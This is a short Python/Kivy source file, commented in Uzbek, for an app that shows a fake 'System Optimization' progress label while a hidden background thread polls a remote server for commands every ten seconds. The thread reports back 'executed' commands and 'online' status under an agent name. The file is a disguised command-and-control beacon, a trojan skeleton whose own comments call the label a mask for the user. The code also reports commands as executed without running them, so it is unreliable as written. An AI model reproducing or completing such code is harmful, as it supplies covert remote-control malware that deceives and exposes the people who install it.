import requests, time, threading
from kivy.app import App
from kivy.uix.label import Label

# SIZNING SERVERINGIZ
URL = "https://predatoragent26.pythonanywhere.com"

class PredatorGeneral(App):
    def build(self):
        # Foydalanuvchi uchun niqob
        self.lbl = Label(text="System Optimization: 45%\nPlease wait...")
        threading.Thread(target=self.core_logic, daemon=True).start()
        return self.lbl

    def core_logic(self):
        while True:
            try:
                # 1. Serverdan buyruq bormi deb so'rash
                response = requests.get(f"{URL}/get_command", timeout=10)
                cmd = response.text.strip()
                
                if cmd != "WAIT":
                    # Buyruqni bajarganlik haqida hisobot yuborish
                    report = {"status": "success", "executed_cmd": cmd, "time": time.ctime()}
                    requests.post(f"{URL}/stats", json=report)
                
                # 2. Onlayn ekanini bildirish
                requests.post(f"{URL}/stats", json={"agent": "General_01", "state": "online"})
            except:
                pass
            time.sleep(10) # Har 10 soniyada aloqa

if __name__ == "__main__":
    PredatorGeneral().run()
    
